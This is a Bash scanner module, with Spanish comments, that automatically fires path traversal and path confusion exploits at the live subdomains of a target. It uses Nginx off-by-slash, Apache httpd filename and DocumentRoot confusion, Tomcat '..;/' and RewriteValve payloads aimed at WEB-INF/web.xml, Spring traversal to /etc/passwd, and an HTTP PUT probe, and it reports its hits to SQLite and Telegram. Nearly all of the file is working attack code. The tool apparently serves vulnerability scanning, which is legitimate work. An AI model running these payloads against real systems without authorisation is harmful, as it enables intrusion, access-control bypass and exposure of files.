#!/usr/bin/env bash
# ============================================================
#  modules/26_path_confusion.sh
#  Fase 26: Path Traversal y Confusion Attacks
#
#  IMPORTANTE: Cada técnica solo se lanza contra la tecnología
#  que puede tenerla. No se lanza nada contra targets que no
#  tengan la tecnología correspondiente detectada.
#
#  Técnicas implementadas:
#
#  [Nginx]
#    1. Off-by-slash (Orange Tsai — BlackHat 2018)
#       → location sin trailing slash + alias con slash
#
#    2. merge_slashes bypass via proxy_pass
#
#  [Apache httpd]
#    3. Confusion Attacks (Orange Tsai — BlackHat 2024)
#       → CVE-2024-38475/38476/38477/38473/38474/39573
#       → Filename confusion: ? bypasea ACL
#       → DocumentRoot confusion: código fuente expuesto
#
#  [Apache Tomcat]
#    4. ..;/ semicolon path confusion (CVE-2025-24813)
#       → Security checker lee /app/user/ pero Tomcat
#         procesa ..;/ como traversal
#
#    5. RewriteValve traversal (CVE-2025-55752)
#       → Normalización antes de decode bypasea WEB-INF
#
#  [Spring Framework]
#    6. Static resource path traversal (CVE-2024-38819)
#       → WebMvc.fn / WebFlux.fn con FileSystemResource
#
#  Referencias:
#    Orange Tsai: https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
#    CVE-2025-24813: github.com/MuhammadWaseem29/CVE-2025-24813
#    CVE-2025-55752: github.com/TAM-K592/CVE-2025-55752
#    CVE-2024-38819: spring.io/security/cve-2024-38819
# ============================================================

MODULE_NAME="path_confusion"
MODULE_DESC="Path Traversal y Confusion Attacks (Orange Tsai + Tomcat + Spring)"

# Directorios comunes en alias Nginx
NGINX_ALIAS_DIRS=(
  "static" "assets" "media" "files" "images" "img"
  "js" "css" "fonts" "upload" "uploads" "public"
  "content" "dist" "build" "resources" "storage"
  "downloads" "docs" "data" "api" "v1" "v2"
)

# ── Detectar tecnología de un subdominio ──────────────────────
_detect_server_tech() {
  local URL="$1"
  local PROXY_FLAG="$2"

  local HEADERS
  HEADERS=$(curl -sI --max-time 8 ${PROXY_FLAG} "$URL" 2>/dev/null)

  local SERVER
  SERVER=$(echo "$HEADERS" | grep -i "^Server:" | head -1 | tr -d '\r\n')
  local POWERED
  POWERED=$(echo "$HEADERS" | grep -i "^X-Powered-By:" | head -1 | tr -d '\r\n')

  local TECH=""

  # Nginx
  echo "$SERVER" | grep -qi "nginx" && TECH="${TECH}:nginx"

  # Apache httpd (no Tomcat)
  echo "$SERVER" | grep -qi "Apache" && \
    ! echo "$SERVER" | grep -qi "Tomcat" && \
    TECH="${TECH}:apache_httpd"

  # Tomcat — varias formas de detectarlo
  echo "$SERVER"  | grep -qi "Tomcat"   && TECH="${TECH}:tomcat"
  echo "$POWERED" | grep -qi "Tomcat"   && TECH="${TECH}:tomcat"
  echo "$HEADERS" | grep -qi "JSESSIONID\|jsessionid" && TECH="${TECH}:tomcat"

  # Spring Boot — actuator o headers específicos
  echo "$HEADERS" | grep -qi "X-Application-Context\|spring" && TECH="${TECH}:spring"
  # También detectar si hay actuator accesible
  local ACT_STATUS
  ACT_STATUS=$(curl -sL --max-time 5 ${PROXY_FLAG} \
    -o /dev/null -w "%{http_code}" "${URL}/actuator" 2>/dev/null)
  [[ "$ACT_STATUS" == "200" ]] && TECH="${TECH}:spring"

  echo "$TECH"
}

# ── Detectar tech desde DB ────────────────────────────────────
_get_tech_subs() {
  local DOMAIN_ID="$1"
  local TECH_PATTERN="$2"
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND tech_name LIKE '${TECH_PATTERN}'
     UNION
     SELECT DISTINCT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive'
       AND subdomain IN (
         SELECT DISTINCT subdomain FROM technologies
         WHERE domain_id=${DOMAIN_ID}
           AND tech_name LIKE '${TECH_PATTERN}'
       );" 2>/dev/null
}

_get_alive_subs() {
  local DOMAIN_ID="$1"
  sqlite3 "$DB_PATH" \
    "SELECT subdomain FROM subdomains
     WHERE domain_id=${DOMAIN_ID} AND status='alive';" 2>/dev/null
}

# ── Helper: comparar respuestas ───────────────────────────────
_responses_similar() {
  local S1="$1" L1="$2" S2="$3" L2="$4"
  [[ "$S1" != "$S2" ]] && return 1
  local DIFF=$(( L1 - L2 ))
  [[ "${DIFF#-}" -le 100 ]] && return 0
  return 1
}

# ── Helper: registrar finding ─────────────────────────────────
_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" URL="$3"
  local TYPE="$4" SEV="$5" DETAIL="$6" TEMPLATE="$7"

  db_add_finding "$DOMAIN_ID" "path_confusion" "$SEV" \
    "$URL" "$TEMPLATE" "$DETAIL"

  local EMOJI="🔴"; [[ "$SEV" == "medium" ]] && EMOJI="🟠"
  log_warn "  ⚡ [$SEV] $TYPE: $URL"

  _telegram_send "${EMOJI} *Path Confusion — ${TYPE}*
🌐 \`${DOMAIN}\`
🔗 \`${URL}\`
📋 ${DETAIL:0:250}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
}

# ══════════════════════════════════════════════════════════════
#  1. NGINX — Off-by-slash (Orange Tsai BlackHat 2018)
#  Solo se ejecuta si la tecnología detectada es Nginx
# ══════════════════════════════════════════════════════════════
_test_nginx_off_by_slash() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Nginx off-by-slash] $BASE"

  # Obtener respuesta de la raíz para comparar
  local ROOT_S ROOT_L
  ROOT_S=$(curl -sL --max-time 8 ${PROXY} \
    -o /tmp/.ot_root_$$ -w "%{http_code}" "${BASE}/" 2>/dev/null)
  ROOT_L=$(wc -c < /tmp/.ot_root_$$ 2>/dev/null || echo 0)
  rm -f /tmp/.ot_root_$$

  for DIR in "${NGINX_ALIAS_DIRS[@]}"; do
    # Verificar que el path base da 404 (existe pero archivo no)
    local PROBE_S
    PROBE_S=$(curl -sL --max-time 6 ${PROXY} \
      -o /dev/null -w "%{http_code}" \
      "${BASE}/${DIR}/hackeadora_nonexistent_8x7z" 2>/dev/null)
    [[ "$PROBE_S" != "404" ]] && continue

    # Probar traversal /dir../
    local TRAV_S TRAV_L
    TRAV_S=$(curl -sL --max-time 8 ${PROXY} \
      -o /tmp/.ot_trav_$$ -w "%{http_code}" \
      "${BASE}/${DIR}../" 2>/dev/null)
    TRAV_L=$(wc -c < /tmp/.ot_trav_$$ 2>/dev/null || echo 0)
    rm -f /tmp/.ot_trav_$$

    if _responses_similar "$TRAV_S" "$TRAV_L" "$ROOT_S" "$ROOT_L" && \
       [[ "$TRAV_S" == "200" ]]; then
      # Confirmar con un recurso conocido
      local CONF_S
      CONF_S=$(curl -sL --max-time 8 ${PROXY} \
        -o /dev/null -w "%{http_code}" \
        "${BASE}/${DIR}../index.html" 2>/dev/null)
      if [[ "$CONF_S" == "200" ]]; then
        _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/${DIR}../" \
          "Nginx Off-by-Slash" "high" \
          "Orange Tsai BH2018: alias traversal confirmado via /${DIR}../" \
          "nginx_off_by_slash"
      fi
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  2. NGINX — merge_slashes + proxy_pass
#  Solo se ejecuta si la tecnología detectada es Nginx
# ══════════════════════════════════════════════════════════════
_test_nginx_merge_slashes() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Nginx merge_slashes] $BASE"

  local API_PATHS
  API_PATHS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE}%'
       AND (url LIKE '%/api/%' OR url LIKE '%/v1/%' OR url LIKE '%/v2/%')
     LIMIT 8;" 2>/dev/null)

  local ROOT_S ROOT_L
  ROOT_S=$(curl -sL --max-time 8 ${PROXY} \
    -o /tmp/.ot_msr_$$ -w "%{http_code}" "${BASE}/" 2>/dev/null)
  ROOT_L=$(wc -c < /tmp/.ot_msr_$$ 2>/dev/null || echo 0)
  rm -f /tmp/.ot_msr_$$

  while IFS= read -r API_URL; do
    [[ -z "$API_URL" ]] && continue
    local SEG
    SEG=$(echo "$API_URL" | sed 's|https\?://[^/]*||' | cut -d'/' -f2)
    [[ -z "$SEG" ]] && continue

    local TRAV_S TRAV_L
    TRAV_S=$(curl -sL --max-time 8 ${PROXY} --path-as-is \
      -o /tmp/.ot_ms_$$ -w "%{http_code}" \
      "${BASE}/${SEG}../" 2>/dev/null)
    TRAV_L=$(wc -c < /tmp/.ot_ms_$$ 2>/dev/null || echo 0)
    rm -f /tmp/.ot_ms_$$

    if _responses_similar "$TRAV_S" "$TRAV_L" "$ROOT_S" "$ROOT_L" && \
       [[ "$TRAV_S" == "200" ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/${SEG}../" \
        "Nginx merge_slashes bypass" "high" \
        "proxy_pass traversal: /${SEG}../ → raíz del backend" \
        "nginx_merge_slashes"
    fi
  done <<< "$API_PATHS"
}

# ══════════════════════════════════════════════════════════════
#  3. APACHE httpd — Confusion Attacks (Orange Tsai BH2024)
#  CVE-2024-38473/38474/38475/38476/38477/39573
#  Solo si tecnología es Apache httpd (NO Tomcat)
# ══════════════════════════════════════════════════════════════
_test_apache_confusion() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Apache Confusion Attacks BH2024] $BASE"

  # Nuclei con todos los CVEs de Orange Tsai 2024
  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE" \
      -tags "apache,cve-2024-38475,cve-2024-38476,cve-2024-38477,cve-2024-38473,cve-2024-38474,cve-2024-39573" \
      -silent -json 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','medium'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        _finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
          "Apache Confusion (Orange Tsai BH2024)" "$SEV" \
          "CVE $TPL — Confusion Attack" "nuclei:$TPL"
      done
  fi

  # Test manual: ? para bypassear ACL (Filename Confusion)
  for PPATH in "/admin" "/administrator" "/manager" "/.htaccess" \
               "/config" "/.env" "/server-status" "/phpinfo.php"; do
    local S_NORMAL
    S_NORMAL=$(curl -sL --max-time 8 ${PROXY} \
      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}" 2>/dev/null)
    [[ "$S_NORMAL" != "403" && "$S_NORMAL" != "401" ]] && continue

    # Test con ? — Filename Confusion CVE-2024-38475
    local S_Q
    S_Q=$(curl -sL --max-time 8 ${PROXY} \
      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}?" 2>/dev/null)
    if [[ "$S_Q" == "200" ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PPATH}?" \
        "Apache Filename Confusion — ACL Bypass" "high" \
        "? bypasea control de acceso 403→200 en ${PPATH} (CVE-2024-38475)" \
        "apache_filename_confusion"
    fi

    # Test con # encoded
    local S_HASH
    S_HASH=$(curl -sL --max-time 8 ${PROXY} -g \
      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}%23" 2>/dev/null)
    if [[ "$S_HASH" == "200" ]]; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PPATH}%23" \
        "Apache Filename Confusion — Hash Bypass" "high" \
        "%23 bypasea control de acceso en ${PPATH}" \
        "apache_hash_confusion"
    fi
  done

  # DocumentRoot Confusion — exposición de código fuente PHP
  for TEST in "/index.php%3F" "/index.php%3F.txt" "/config.php%3F"; do
    local S_SRC BODY
    S_SRC=$(curl -sL --max-time 8 ${PROXY} -g \
      -o /tmp/.ot_src_$$ -w "%{http_code}" "${BASE}${TEST}" 2>/dev/null)
    BODY=$(head -c 200 /tmp/.ot_src_$$ 2>/dev/null); rm -f /tmp/.ot_src_$$

    if [[ "$S_SRC" == "200" ]] && \
       echo "$BODY" | grep -qP '<\?php|<\?=|mysql_|PDO::|\$_GET|\$_POST'; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${TEST}" \
        "Apache DocumentRoot Confusion — PHP Source" "critical" \
        "Código fuente PHP expuesto via DocumentRoot confusion: ${TEST}" \
        "apache_docroot_confusion"
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  4. TOMCAT — ..;/ semicolon path confusion (CVE-2025-24813)
#  El security checker ve /app/user/ pero Tomcat resuelve ..;/
#  Solo si tecnología es Tomcat
# ══════════════════════════════════════════════════════════════
_test_tomcat_semicolon() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Tomcat ..;/ semicolon confusion CVE-2025-24813] $BASE"

  # Obtener rutas de la aplicación para construir payloads
  local APP_PATHS
  APP_PATHS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE}%'
     LIMIT 20;" 2>/dev/null | \
    sed "s|${BASE}||" | grep -oP '^/[^?#]+' | \
    awk -F'/' 'NF>=3 {print $0}' | sort -u | head -10)

  # Paths protegidos típicos de Tomcat
  local PROTECTED=(
    "/WEB-INF/web.xml"
    "/META-INF/MANIFEST.MF"
    "/WEB-INF/classes/"
    "/admin/"
    "/manager/"
    "/host-manager/"
  )

  for PPATH in "${PROTECTED[@]}"; do
    # Status normal (debería ser 403/404)
    local S_NORMAL
    S_NORMAL=$(curl -sL --max-time 8 ${PROXY} \
      -o /dev/null -w "%{http_code}" "${BASE}${PPATH}" 2>/dev/null)
    [[ "$S_NORMAL" != "403" && "$S_NORMAL" != "404" ]] && continue

    # Construir payload ..;/ usando rutas de la app
    # Patrón: /app/user/..;/WEB-INF/web.xml
    while IFS= read -r APP_PATH; do
      [[ -z "$APP_PATH" ]] && continue
      local SEG
      SEG=$(echo "$APP_PATH" | cut -d'/' -f1-2)
      [[ -z "$SEG" ]] && continue

      local PAYLOAD="${SEG}/..;${PPATH}"
      local S_TRAV BODY_TRAV
      S_TRAV=$(curl -sL --max-time 8 ${PROXY} -g \
        -o /tmp/.ot_tc_$$ -w "%{http_code}" "${BASE}${PAYLOAD}" 2>/dev/null)
      BODY_TRAV=$(head -c 500 /tmp/.ot_tc_$$ 2>/dev/null)
      rm -f /tmp/.ot_tc_$$

      if [[ "$S_TRAV" == "200" ]]; then
        local CONFIRM=false
        # Verificar que realmente obtuvimos el archivo protegido
        echo "$PPATH" | grep -q "web.xml" && \
          echo "$BODY_TRAV" | grep -qi "web-app\|servlet\|<web-app" && \
          CONFIRM=true
        echo "$PPATH" | grep -q "MANIFEST" && \
          echo "$BODY_TRAV" | grep -qi "Manifest-Version\|Main-Class" && \
          CONFIRM=true

        if $CONFIRM; then
          _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PAYLOAD}" \
            "Tomcat ..;/ Path Confusion" "critical" \
            "CVE-2025-24813: ..;/ bypasea security checker → ${PPATH} expuesto" \
            "tomcat_semicolon_traversal"
        fi
      fi
    done <<< "$APP_PATHS"
  done

  # También probar patrones directos estándar de Tomcat
  local DIRECT_PAYLOADS=(
    "/..;/WEB-INF/web.xml"
    "/..;/META-INF/"
    "/app/..;/WEB-INF/web.xml"
    "/api/..;/WEB-INF/web.xml"
  )
  for PAYLOAD in "${DIRECT_PAYLOADS[@]}"; do
    local S_D BODY_D
    S_D=$(curl -sL --max-time 8 ${PROXY} -g \
      -o /tmp/.ot_td_$$ -w "%{http_code}" "${BASE}${PAYLOAD}" 2>/dev/null)
    BODY_D=$(head -c 200 /tmp/.ot_td_$$ 2>/dev/null)
    rm -f /tmp/.ot_td_$$

    if [[ "$S_D" == "200" ]] && \
       echo "$BODY_D" | grep -qi "web-app\|servlet\|Manifest-Version"; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PAYLOAD}" \
        "Tomcat ..;/ Path Confusion" "critical" \
        "CVE-2025-24813: acceso directo a archivo protegido via ..;/" \
        "tomcat_semicolon_direct"
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  5. TOMCAT — RewriteValve traversal (CVE-2025-55752)
#  Normalización antes de decode bypasea WEB-INF/META-INF
#  Solo si tecnología es Tomcat
# ══════════════════════════════════════════════════════════════
_test_tomcat_rewrite_traversal() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Tomcat RewriteValve CVE-2025-55752] $BASE"

  # Nuclei con CVE-2025-55752 y CVE-2025-24813
  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE" \
      -tags "tomcat,cve-2025-55752,cve-2025-24813" \
      -silent -json 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','high'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        _finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
          "Tomcat RewriteValve Traversal" "$SEV" \
          "CVE-2025-55752: normalización antes de decode → bypass WEB-INF" \
          "nuclei:$TPL"
      done
  fi

  # Test manual: query param rewrite → WEB-INF bypass
  # Patrón: /foo?bar=../WEB-INF/web.xml
  local REWRITE_PAYLOADS=(
    "?path=../WEB-INF/web.xml"
    "?file=../WEB-INF/web.xml"
    "?resource=..%2FWEB-INF%2Fweb.xml"
    "?q=%2e%2e%2fWEB-INF%2fweb.xml"
  )

  # Obtener URLs base de la app
  local APP_BASES
  APP_BASES=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM urls
     WHERE domain_id=${DOMAIN_ID}
       AND url LIKE '%${BASE}%'
       AND url LIKE '%?%'
     LIMIT 5;" 2>/dev/null | sed 's|?.*||')

  while IFS= read -r APP_BASE; do
    [[ -z "$APP_BASE" ]] && continue
    for QPAYLOAD in "${REWRITE_PAYLOADS[@]}"; do
      local S_R BODY_R
      S_R=$(curl -sL --max-time 8 ${PROXY} -g \
        -o /tmp/.ot_rv_$$ -w "%{http_code}" "${APP_BASE}${QPAYLOAD}" 2>/dev/null)
      BODY_R=$(head -c 200 /tmp/.ot_rv_$$ 2>/dev/null)
      rm -f /tmp/.ot_rv_$$

      if [[ "$S_R" == "200" ]] && \
         echo "$BODY_R" | grep -qi "web-app\|servlet"; then
        _finding "$DOMAIN_ID" "$DOMAIN" "${APP_BASE}${QPAYLOAD}" \
          "Tomcat RewriteValve — WEB-INF bypass" "critical" \
          "CVE-2025-55752: query param rewrite → WEB-INF/web.xml expuesto" \
          "tomcat_rewrite_traversal"
      fi
    done
  done <<< "$APP_BASES"

  # También verificar si PUT está habilitado (escala a RCE)
  local PUT_S
  PUT_S=$(curl -sL --max-time 8 ${PROXY} \
    -X PUT \
    -d "test" \
    -o /dev/null -w "%{http_code}" \
    "${BASE}/hackeadora_put_test_$$" 2>/dev/null)
  if [[ "$PUT_S" == "201" || "$PUT_S" == "200" ]]; then
    _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}" \
      "Tomcat HTTP PUT habilitado" "high" \
      "PUT habilitado — combinado con CVE-2025-55752 puede llevar a RCE" \
      "tomcat_put_enabled"
    # Limpiar el archivo de test
    curl -sL --max-time 5 ${PROXY} \
      -X DELETE "${BASE}/hackeadora_put_test_$$" 2>/dev/null || true
  fi
}

# ══════════════════════════════════════════════════════════════
#  6. SPRING FRAMEWORK — Static resource path traversal
#  CVE-2024-38819 — WebMvc.fn / WebFlux.fn + FileSystemResource
#  Solo si tecnología es Spring Boot/Framework
# ══════════════════════════════════════════════════════════════
_test_spring_traversal() {
  local BASE="$1" DOMAIN_ID="$2" DOMAIN="$3" PROXY="$4"

  log_info "  [Spring CVE-2024-38819 path traversal] $BASE"

  if command -v nuclei &>/dev/null; then
    nuclei -u "$BASE" \
      -tags "spring,cve-2024-38819,cve-2024-38816" \
      -silent -json 2>/dev/null | \
      while IFS= read -r LINE; do
        [[ -z "$LINE" ]] && continue
        local TPL SEV HOST
        TPL=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
        SEV=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','high'))" 2>/dev/null)
        HOST=$(echo "$LINE"| python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('matched-at',d.get('host','?')))" 2>/dev/null)
        _finding "$DOMAIN_ID" "$DOMAIN" "$HOST" \
          "Spring Framework Path Traversal" "$SEV" \
          "CVE-2024-38819: WebMvc.fn/WebFlux.fn con FileSystemResource" \
          "nuclei:$TPL"
      done
  fi

  # Test manual sobre rutas estáticas de Spring
  local SPRING_PAYLOADS=(
    "/static/../../../etc/passwd"
    "/resources/..%2F..%2F..%2Fetc%2Fpasswd"
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    "/webjars/../../../etc/passwd"
  )
  for PAYLOAD in "${SPRING_PAYLOADS[@]}"; do
    local S_SP BODY_SP
    S_SP=$(curl -sL --max-time 8 ${PROXY} -g \
      -o /tmp/.ot_sp_$$ -w "%{http_code}" "${BASE}${PAYLOAD}" 2>/dev/null)
    BODY_SP=$(head -c 100 /tmp/.ot_sp_$$ 2>/dev/null)
    rm -f /tmp/.ot_sp_$$

    if [[ "$S_SP" == "200" ]] && \
       echo "$BODY_SP" | grep -qP 'root:x:|daemon:|nobody:'; then
      _finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${PAYLOAD}" \
        "Spring Path Traversal — /etc/passwd" "critical" \
        "CVE-2024-38819: /etc/passwd accesible via static resource traversal" \
        "spring_path_traversal"
    fi
  done
}

# ══════════════════════════════════════════════════════════════
#  Función principal
# ══════════════════════════════════════════════════════════════
module_run() {
  local DOMAIN="$1"
  local DOMAIN_ID="$2"
  local OUT_DIR="$3"

  log_phase "Módulo 26 — $MODULE_DESC: $DOMAIN"

  source "$(dirname "$0")/../core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local FINDINGS_BEFORE
  FINDINGS_BEFORE=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='path_confusion';" \
    2>/dev/null || echo 0)

  # ── Obtener subdominios alive ──────────────────────────────
  local ALL_SUBS
  ALL_SUBS=$(_get_alive_subs "$DOMAIN_ID")
  [[ -z "$ALL_SUBS" ]] && [[ -s "$OUT_DIR/subs_alive.txt" ]] && \
    ALL_SUBS=$(cat "$OUT_DIR/subs_alive.txt")

  local CHECKED=0

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    ((CHECKED++))
    local BASE="https://${SUB}"

    # ── Detectar tecnología del subdominio ─────────────────
    # Primero desde la DB (módulo 10 ya lo hizo)
    local TECH_DB
    TECH_DB=$(sqlite3 "$DB_PATH" \
      "SELECT GROUP_CONCAT(tech_name, ',') FROM technologies
       WHERE domain_id=${DOMAIN_ID} AND subdomain='${SUB}';" \
      2>/dev/null | tr ',' '\n' | tr '[:upper:]' '[:lower:]' | tr '\n' ':')

    # Si no hay tech en DB, detectar en tiempo real
    local TECH_LIVE=""
    [[ -z "$TECH_DB" ]] && TECH_LIVE=$(_detect_server_tech "$BASE" "$CURL_PROXY")

    local TECH="${TECH_DB}${TECH_LIVE}"

    # Log de lo que vamos a testear
    local TESTS=""
    echo "$TECH" | grep -qi "nginx"      && TESTS="${TESTS} nginx"
    echo "$TECH" | grep -qi "apache"     && ! echo "$TECH" | grep -qi "tomcat" && TESTS="${TESTS} apache_httpd"
    echo "$TECH" | grep -qi "tomcat"     && TESTS="${TESTS} tomcat"
    echo "$TECH" | grep -qi "spring\|java\|boot" && TESTS="${TESTS} spring"

    # Si no detectamos nada específico, intentar off-by-slash
    # (muy común, falsos positivos bajos)
    [[ -z "$TESTS" ]] && TESTS=" nginx_probe"

    log_info "[$CHECKED] $BASE — tecnología:${TESTS}"

    # ── Lanzar solo los tests relevantes ──────────────────
    if echo "$TESTS" | grep -qi "nginx"; then
      _test_nginx_off_by_slash  "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
      _test_nginx_merge_slashes "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    if echo "$TESTS" | grep -qi "apache_httpd"; then
      _test_apache_confusion    "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    if echo "$TESTS" | grep -qi "tomcat"; then
      _test_tomcat_semicolon         "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
      _test_tomcat_rewrite_traversal "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    if echo "$TESTS" | grep -qi "spring"; then
      _test_spring_traversal    "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

    # off-by-slash si no detectamos nada (probe ligero)
    if echo "$TESTS" | grep -qi "nginx_probe"; then
      _test_nginx_off_by_slash  "$BASE" "$DOMAIN_ID" "$DOMAIN" "$CURL_PROXY"
    fi

  done <<< "$ALL_SUBS"

  local FINDINGS_AFTER NEW_FINDINGS
  FINDINGS_AFTER=$(sqlite3 "$DB_PATH" \
    "SELECT COUNT(*) FROM findings
     WHERE domain_id=${DOMAIN_ID} AND type='path_confusion';" \
    2>/dev/null || echo 0)
  NEW_FINDINGS=$(( FINDINGS_AFTER - FINDINGS_BEFORE ))

  [[ "$NEW_FINDINGS" -gt 0 ]] && \
    _telegram_send "🔀 *Path Confusion completado*
🌐 \`${DOMAIN}\`
🔍 Subdominios: \`${CHECKED}\`
⚡ Findings: \`${NEW_FINDINGS}\`
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true

  log_ok "$MODULE_DESC: $NEW_FINDINGS findings en $CHECKED subdominios"
}
